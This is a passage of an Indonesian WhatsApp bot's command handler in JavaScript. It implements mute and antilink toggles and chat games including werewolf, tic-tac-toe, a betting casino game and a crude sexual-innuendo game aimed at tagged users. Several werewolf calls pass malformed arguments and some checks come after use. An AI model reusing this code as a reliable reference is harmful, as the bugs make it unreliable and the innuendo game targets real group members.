fs.writeFileSync('./data/antilinkgc.json', JSON.stringify(nplinkgc, null, 2))
m.reply('Sukses menonaktifkan antilink gc!')
} else {
m.reply(`Contoh: ${prefix+command} on/off`)
}}
break

case 'mute': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
db.data.chats[m.chat].mute = true
await m.reply('Sukses mute untuk grup ini.')
} else if (args[0] === 'off') {
db.data.chats[m.chat].mute = false
await m.reply('Sukses mute untuk grup ini.')
}}
break

// === Games Menu

case 'family100': 
case 'f100': {
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/family100.json')));
console.log('Jawaban: '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
let jwb = family100[from].jawaban
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab:\n`
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}}
break

case 'suit':
case 'suitpvp': {
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return m.reply(`Selesaikan suit mu yang sebelumnya!`)
gue = `0@s.whatsapp.net`
if (!froms) return m.reply(`Siapa yang ingin kamu tantang?\n\nContoh: ${prefix+command} @${gue.split('@')[0]}`)
if (froms === botNumber) return m.reply(`Tidak bisa bermain dengan bot!`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return m.reply(`Orang nya lagi main sama yang lain!`)
var hadiah = randomNomor(10, 20)
let poin = 10
let poin_lose = 10
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await rafatharcode.sendTeks(from, `@${m.sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit\n\nKirim *gas/gak* untuk bermain`, m),
id: id,
p: m.sender,
p2: froms,
status: 'Wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) rafatharcode.sendMessage(from, {text: `Waktu suit habis!` }, {quoted: m})
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'ttt':
case 'ttc':
case 'tictactoe': {
if (!m.isGroup) return onlyGrup()
let TicTacToe = require("./lib/game/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply( 'Kamu masih didalam game!')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Lawan bermain ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik .nyerah untuk menyerah`
if (room.x !== room.o) await rafatharcode.sendText(room.x, str, m, { mentions: parseMention(str) } )
await rafatharcode.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu lawan bermain' + (text ? ` mengetik command dibawah ini ${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'delttt': 
case 'delttc':
case 'deltictactoe': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return m.reply( `Kamu sedang tidak bermain tictactoe!`)
delete this.game[roomnya.id]
m.reply(`Game tictactoe telah diakhiri!`)
}
break

case 'tebakbom': 
case 'petakbom': {
if (petakbom[m.sender]) return m.reply(`Sesi game mu belum terselesaikan, lanjutkan:\n\n${petakbom[sender].board.join("")}\n\nKetik ${prefix}delpetakbom untuk menghapus sesi game`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[m.sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"],
bomb: 3,
lolos: 6,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await m.reply(`*PETAK BOM*

${petakbom[m.sender].board.slice(0, 3).join("")}
${petakbom[m.sender].board.slice(3, 6).join("")}
${petakbom[m.sender].board.slice(6).join("")}

Pillih angka diatas tetapi berhati-hati
lah, karena ada bom!

Bomb: ${petakbom[m.sender].bomb}
Nyawa: ${petakbom[m.sender].nyawa.join("")}`);
}
break

case 'delpetakbom': {
if (!(m.sender in petakbom)) return m.reply(`Kamu sedang tidak bermain petakbom!`)
delete petakbom[m.sender];
m.reply(`Game petakbom telah diakhiri!`)
}
break

case 'casino': {
if (!m.isGroup) return onlyGrup()
if (!text) return m.reply(`Contoh: ${prefix+command} @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
if (fs.existsSync(`./data/${m.chat}.json`)) return m.reply(`Masih ada sesi sebelumnya\nKetik ${prefix}delcasino untuk menghapus sesi`)
if (!args[1]) return m.reply('Masukkan nominal nya!')
if (args[1].includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return m.reply('Nominal harus herupa angka!')
var anu = cekSaldo(m.sender, db_saldo)
var ani = cekSaldo(m.mentionedJid[0], db_saldo)
if (anu < args[1] || anu == 'undefined') return m.reply(`Saldo tidak mencukupi, kumpulkan terlebih dahulu\nKetik ${prefix}saldo untuk mengecek saldo mu`)
if (ani < args[1] || ani == 'undefined') return m.reply(`Saldo lawan tidak mencukupi untuk bermain dengan mu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('casino', m.sender, cmd)
fs.writeFileSync(`./data/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
var starGame = `*🎰 GAME CASINO 💰*\n\n• @${m.sender.replace("@s.whatsapp.net", "")}\nMenantang 乂\n• ${args[0]}\n\nDengan nominal: Rp ${parseInt(args[1])}\nSilahkan tunggu ${args[0]} memilih`
buton = `{\"display_text\":\"TERIMA\",\"id\":\"Y\"}`
butoff = `{\"display_text\":\"TOLAK\",\"id\":\"N\"}`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: starGame
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": buton
},
{
"name": "quick_reply",
"buttonParamsJson": butoff
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
}
break

case 'delcasino': {
if (fs.existsSync('./data/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./data/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('delcasino', m.sender, cmd)
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('delcasino', m.sender, cmd)
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else if (isOwner) {
addCountCmd('delcasino', m.sender, cmd)
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else {
m.reply('Hanya untuk pemain!')
}
} else {
m.reply('Kamu sedang tidak bermain casino!')}
}
break

case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
const read = await jimp.read(image);
const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
return data;
};

let {
emoji_role,
sesi,
playerOnGame,
playerOnRoom,
playerExit,
dataPlayer,
dataPlayerById,
getPlayerById,
getPlayerById2,
killWerewolf,
killww,
dreamySeer,
sorcerer,
protectGuardian,
roleShuffle,
roleChanger,
roleAmount,
roleGenerator,
addTimer,
startGame,
playerHidup,
playerMati,
vote,
voteResult,
clearAllVote,
getWinner,
win,
pagi,
malam,
skill,
voteStart,
voteDone,
voting,
run,
run_vote,
run_malam,
runprefixagi
} = require('./lib/game/werewolf.js')

// [ Thumbnail ] 
let thumb =
"https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

const {
sender,
chat
} = m;
rafatharcode.werewolf = rafatharcode.werewolf ? rafatharcode.werewolf : {};
const ww = rafatharcode.werewolf ? rafatharcode.werewolf : {};
const data = ww[chat];
const value = args[0];
const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
// [ Membuat Room ]
if (value === "create") {
if (chat in ww) return m.reply("Group masih dalam sesi permainan");
if (playerOnGame(sender, ww) === true)
return m.reply("Kamu masih dalam sesi game");
ww[chat] = {
room: chat,
owner: sender,
status: false,
iswin: null,
cooldown: null,
day: 0,
time: "malem",
player: [],
dead: [],
voting: false,
seer: false,
guardian: [],
};
await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

// [ Join sesi permainan ]
} else if (value === "join") {
if (!ww[chat]) return m.reply("Belum ada sesi permainan");
if (ww[chat].status === true)
return m.reply("Sesi permainan sudah dimulai");
if (ww[chat].player.length > 16)
return m.reply("Maaf jumlah player telah penuh");
if (playerOnRoom(sender, chat, ww) === true)
return m.reply("Kamu sudah join dalam room ini");
if (playerOnGame(sender, ww) === true)
return m.reply("Kamu masih dalam sesi game");
let data = {
id: sender,
number: ww[chat].player.length + 1,
sesi: chat,
status: false,
role: false,
effect: [],
vote: 0,
isdead: false,
isvote: false,
};
ww[chat].player.push(data);
let player = [];
let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
for (let i = 0; i < ww[chat].player.length; i++) {
text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
"@s.whatsapp.net",
""
)}\n`;
player.push(ww[chat].player[i].id);
}
text += "\nJumlah player minimal adalah 5 dan maximal 15";
rafatharcode.sendMessage(
m.chat, {
text: text.trim(),
contextInfo: {
externalAdReply: {
title: "W E R E W O L F",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: await resize(thumb, 300, 175),
sourceUrl: web,
mediaUrl: thumb,
},
mentionedJid: player,
},
}, {
quoted: m
}
);
// [ Game Play ]
} else if (value === "start") {
if (!ww[chat]) return m.reply("Belum ada sesi permainan");
if (ww[chat].player.length === 0)
return m.reply("Room belum memiliki player");
if (ww[chat].player.length < 5)
return m.reply("Maaf jumlah player belum memenuhi syarat");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("Kamu belum join dalam room ini");
if (ww[chat].cooldown > 0) {
if (ww[chat].time === "voting") {
clearAllVote(chat, ww);
addTimer(chat, ww);
return await run_vote(rafatharcode. chat, ww);
} else if (ww[chat].time === "malem") {
clearAllVote(chat, ww);
addTimer(chat, ww);
return await run_malam(rafatharcode. chat, ww);
} else if (ww[chat].time === "pagi") {
clearAllVote(chat, ww);
addTimer(chat, ww);
return await runprefixagi(rafatharcode. chat, ww);
}
}
if (ww[chat].status === true)
return m.reply("Sesi permainan telah dimulai");
if (ww[chat].owner !== sender)
return m.reply(
`Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
);
let list1 = "";
let list2 = "";
let player = [];
roleGenerator(chat, ww);
addTimer(chat, ww);
startGame(chat, ww);
for (let i = 0; i < ww[chat].player.length; i++) {
list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
i
].id.replace("@s.whatsapp.net", "")}\n`;
player.push(ww[chat].player[i].id);
}
for (let i = 0; i < ww[chat].player.length; i++) {
list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
i
].id.replace("@s.whatsapp.net", "")} ${
ww[chat].player[i].role === "werewolf" ||
ww[chat].player[i].role === "sorcerer"
? `[${ww[chat].player[i].role}]`
: ""
}\n`;
player.push(ww[chat].player[i].id);
}
for (let i = 0; i < ww[chat].player.length; i++) {
// [ Werewolf ]
if (ww[chat].player[i].role === "werewolf") {
if (ww[chat].player[i].isdead != true) {
var textt = `Hai ${rafatharcode.getName(
ww[chat].player[i].id
)}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
"werewolf"
)} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
await rafatharcode.sendMessage(ww[chat].player[i].id, {
text: textt,
mentions: player,
});
}
// [ villager ]
} else if (ww[chat].player[i].role === "warga") {
if (ww[chat].player[i].isdead != true) {
let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${rafatharcode.getName(
ww[chat].player[i].id
)} Peran kamu adalah *Warga Desa* ${emoji_role(
"warga"
)}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
await rafatharcode.sendMessage(ww[chat].player[i].id, {
text: texttt,
mentions: player,
});
}

// [ Penerawangan ]
} else if (ww[chat].player[i].role === "seer") {
if (ww[chat].player[i].isdead != true) {
let texxt = `Hai ${rafatharcode.getName(
ww[chat].player[i].id
)} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
"seer"
)}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

await rafatharcode.sendMessage(ww[chat].player[i].id, {
text: texxt,
mentions: player,
});
}

// [ Guardian ]
} else if (ww[chat].player[i].role === "guardian") {
if (ww[chat].player[i].isdead != true) {
let teext = `Hai ${rafatharcode.getName(
ww[chat].player[i].id
)} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
"guardian"
)}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
await rafatharcode.sendMessage(ww[chat].player[i].id, {
text: teext,
mentions: player,
});
}

// [ Sorcerer ]
} else if (ww[chat].player[i].role === "sorcerer") {
if (ww[chat].player[i].isdead != true) {
let textu = `Hai ${rafatharcode.getName(
ww[chat].player[i].id
)} Kamu terpilih sebagai Penyihir ${emoji_role(
"sorcerer"
)}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

await rafatharcode.sendMessage(ww[chat].player[i].id, {
text: textu,
mentions: player,
});
}
}
}
await rafatharcode.sendMessage(m.chat, {
text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
contextInfo: {
externalAdReply: {
title: "W E R E W O L F",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: await resize(thumb, 300, 175),
sourceUrl: web,
mediaUrl: thumb,
},
mentionedJid: player,
},
});
await run(rafatharcode. chat, ww);
} else if (value === "kill") {
let byId = getPlayerById2(sender, parseInt(target), ww)
if (dataPlayer(sender, ww).role !== "werewolf") 
return m.reply("Peran ini bukan untuk kamu"); 
if (byId.db.data.role === "sorcerer") 
return m.reply("Tidak bisa menggunakan skill untuk teman"); 
if (playerOnGame(sender, ww) === false)
return m.reply("Kamu tidak dalam sesi game")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("Kamu sudah mati")
if (!target || target.length < 1 || target.split('').length > 2) 
return m.reply(`Masukan nomor player \nContoh : \n${prefix+command} kill 1`)
if (isNaN(target)) 
return m.reply("Gunakan hanya nomor")
if (byId.db.data.isdead === true) 
return m.reply("Player sudah mati")
if (byId.db.data.id === sender)
return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
if (byId === false) 
return m.reply("Player tidak terdaftar")
m.reply("Berhasil membunuh player " + parseInt(target)) 
.then(() => { 
dataPlayer(sender, ww).status = true; 
killWerewolf(sender, parseInt(target), ww); 
}); 
} else if (value === "dreamy") { 
if (dataPlayer(sender, ww).role !== "seer") 
return m.reply("Peran ini bukan untuk kamu"); 
if (playerOnGame(sender, ww) === false)
return m.reply("Kamu tidak dalam sesi game")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("Kamu sudah mati")
if (!target || target.length < 1 || target.split('').length > 2) 
return m.reply(`Masukan nomor player \nContoh : \n${prefix+command} kill 1`)
if (isNaN(target)) 
return m.reply("Gunakan hanya nomor")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.data.isdead === true) 
return m.reply("Player sudah mati")
if (byId.db.data.id === sender)
return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
if (byId === false) 
return m.reply("Player tidak terdaftar")
let dreamy = dreamySeer(sender, parseInt(target), ww); 
m.reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
.then(() => { 
dataPlayer(sender, ww).status = true; 
}); 
} else if (value === "deff") { 
if (dataPlayer(sender, ww).role !== "guardian") 
return m.reply("Peran ini bukan untuk kamu"); 
if (playerOnGame(sender, ww) === false)
return m.reply("Kamu tidak dalam sesi game")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("Kamu sudah mati")
if (!target || target.length < 1 || target.split('').length > 2) 
return m.reply(`Masukan nomor player \nContoh : \n${prefix+command} kill 1`)
if (isNaN(target)) 
return m.reply("Gunakan hanya nomor")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.data.isdead === true) 
return m.reply("Player sudah mati")
if (byId.db.data.id === sender)
return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
if (byId === false) 
return m.reply("Player tidak terdaftar")
m.reply(`Berhasil melindungi player ${target}`).then(() => { 
protectGuardian(sender, parseInt(target), ww); 
dataPlayer(sender, ww).status = true; 
}); 
} else if (value === "sorcerer") { 
if (dataPlayer(sender, ww).role !== "sorcerer") 
return m.reply("Peran ini bukan untuk kamu"); 
if (playerOnGame(sender, ww) === false)
return m.reply("Kamu tidak dalam sesi game")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("Kamu sudah mati")
if (!target || target.length < 1 || target.split('').length > 2) 
return m.reply(`Masukan nomor player \nContoh : \n${prefix+command} kill 1`)
if (isNaN(target)) 
return m.reply("Gunakan hanya nomor")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.data.isdead === true) 
return m.reply("Player sudah mati")
if (byId.db.data.id === sender)
return m.reply("Tidak bisa menggunakan skill untuk diri sendiri")
if (byId === false) 
return m.reply("Player tidak terdaftar")
let sorker = sorcerer(sesi(sender), target); 
m.reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
.then(() => { 
dataPlayer(sender, ww).status = true; 
}); 
} else if (value === "vote") {
if (!ww[chat]) return m.reply("Belum ada sesi permainan");
if (ww[chat].status === false)
return m.reply("Sesi permainan belum dimulai");
if (ww[chat].time !== "voting")
return m.reply("Sesi voting belum dimulai");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("Kamu bukan player");
if (dataPlayer(sender, ww).isdead === true)
return m.reply("Kamu sudah mati");
if (!target || target.length < 1)
return m.reply("Masukan nomor player");
if (isNaN(target)) return m.reply("Gunakan hanya nomor");
if (dataPlayer(sender, ww).isvote === true)
return m.reply("Kamu sudah melakukan voting");
b = getPlayerById(chat, sender, parseInt(target), ww);
if (b.db.data.isdead === true)
return m.reply(`Player ${target} sudah mati.`);
if (ww[chat].player.length < parseInt(target))
return m.reply("Invalid");
if (getPlayerById(chat, sender, parseInt(target), ww) === false)
return m.reply("Player tidak terdaftar!");
vote(chat, parseInt(target), sender, ww);
return m.reply("✅ Vote");
} else if (value == "exit") {
if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("Kamu tidak dalam sesi permainan");
if (ww[chat].status === true)
return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
let exitww = `${m.sender.split("@")[0]} Keluar dari permainan`
rafatharcode.sendMessage(
m.chat, {
text: exitww,
contextInfo: {
externalAdReply: {
title: "W E R E W O L F",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: await resize(thumb, 300, 175),
sourceUrl: web,
mediaUrl: thumb,
},
mentionedJid: sender,
},
}, {
quoted: m
}
);  
playerExit(chat, sender, ww);
} else if (value === "delete") {
if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
if (ww[chat].owner !== sender)
return m.reply(
`Hanya @${
ww[chat].owner.split("@")[0]
} yang dapat menghapus sesi permainan ini`
);
m.reply("Sesi permainan berhasil dihapus").then(() => {
delete ww[chat];
});
} else if (value === "player") {
if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("Kamu tidak dalam sesi permainan");
if (ww[chat].player.length === 0)
return m.reply("Sesi permainan belum memiliki player");
let player = [];
let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
for (let i = 0; i < ww[chat].player.length; i++) {
text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
"@s.whatsapp.net",
""
)} ${
ww[chat].player[i].isdead === true
? `☠️ ${ww[chat].player[i].role}`
: ""
}\n`;
player.push(ww[chat].player[i].id);
}
rafatharcode.sendMessage(
m.chat, {
text: text,
contextInfo: {
externalAdReply: {
title: "W E R E W O L F",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: await resize(thumb, 300, 175),
sourceUrl: web,
mediaUrl: thumb,
},
mentionedJid: player,
},
}, {
quoted: m
}
);
} else {
let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
text += ` • ww create\n`;
text += ` • ww join\n`;
text += ` • ww start\n`;
text += ` • ww exit\n`;
text += ` • ww delete\n`;
text += ` • ww player\n`;
text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
rafatharcode.sendMessage(
m.chat, {
text: text.trim(),
contextInfo: {
externalAdReply: {
title: "W E R E W O L F",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: await resize(thumb, 300, 175),
sourceUrl: web,
mediaUrl: thumb,
},
},
}, {quoted: m});
}}
break

case 'wikwik': {
if (!q) return m.reply(`Contoh: ${prefix+command} ayu`)
const argsLower = args.map(arg => arg.toLowerCase());
const petarung1 = argsLower[0];
const petarung2 = argsLower[1];
const totalRounds = 8;
let ronde = 1;
let nyawaPetarung1 = 200;
let nyawaPetarung2 = 200;

let result = `🫶 Wikwik antara ${db.data.users[m.sender].nama} dan ${args[0]} dimulai! 🫦\n\n`;

while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
const pukulan = [
'ajul gedang', 'gaya marmot', 'gaya roket', 'gaya kucing', 'gaya katak'];

const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];

const damagePetarung1 = Math.floor(Math.random() * 50) + 1;
const damagePetarung2 = Math.floor(Math.random() * 50) + 1;

result += `🫦💦 Ronde ${ronde}\n`;
result += `${db.data.users[m.sender].nama} stamina: ${nyawaPetarung1}\n`;
result += `${args[0]} stamina: ${nyawaPetarung2}\n`;
result += `${db.data.users[m.sender].nama}: ${pilihanPetarung1}\n`;
result += `${args[0]}: ${pilihanPetarung2}\n\n`;

if (pilihanPetarung1 === pilihanPetarung2) {
result += `⚔️ Wikwik sedang berlangsung melakukan gaya yang sama! blom ada yang keluar sama sekali.\n`;
} else {
result += `💦 ${db.data.users[m.sender].nama} melakukan ${pilihanPetarung1} dan ${args[0]} melakukan ${pilihanPetarung2}!\n`;
nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10;
nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10;
result += `💔 ${db.data.users[m.sender].nama} menerima jilmek ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`;
result += `💔 ${args[0]} menerima spong ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`;
}

ronde++;
}

result += `\n⏱️ Wikwik akhirnya berakhir!\n`;
result += `${db.data.users[m.sender].nama} stamina akhir: ${nyawaPetarung1}\n`;
result += `${args[0]} stamina akhir: ${nyawaPetarung2}\n`;

if (nyawaPetarung1 > nyawaPetarung2) {
result += `👙 ${db.data.users[m.sender].nama} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
} else if (nyawaPetarung2 > nyawaPetarung1) {
result += `🩲 ${args[0]} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
} else {
result += `👙💦 Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`;
}

await m.reply(`${result}`);
}
break

case 'ngojek':
case 'ojek': {
if (!text) return m.reply(`Contoh: ${prefix+command} lampung|Jakarta\n\n*PENJELASAN*\n${prefix+command} <dari>|<tujuan> / Lampung ke Jakarta`)
const san = args.join(" ")
const jay = san.split("|")[0];
const ya = san.split("|")[1];
if (!jay) return !0 //malas
if (!ya) return !0 //nye
let hah = ["Udin", "Yono", "Agus", "Asep", "Yanto", "Ahmad", "Riski", "Ridho", "Egy", "Pegi", "Rehan", "Yanti", "Putri", "Rahma", "Ica", "Caca", "Ayu", "Rini", "Lani", "Cika", "Nisa", "Alya", "Fikri", "Edo", "Angga", "Putra", "Yahya", "Fahri", "Fadil", "Aldo", "Resky", "Bela", "Kiki", "Zaki", "Reza", "Kak gem", "Uni bakwan"]
let orgnya = hah[Math.floor(Math.random() * hah.length)]
let tmpan = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜👤⬜⬜⬜⬜⬜⬅️🏍️⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
Status: Ojek sedang diperjalanan`
//==============
let bgt = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜🏍️➡️⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
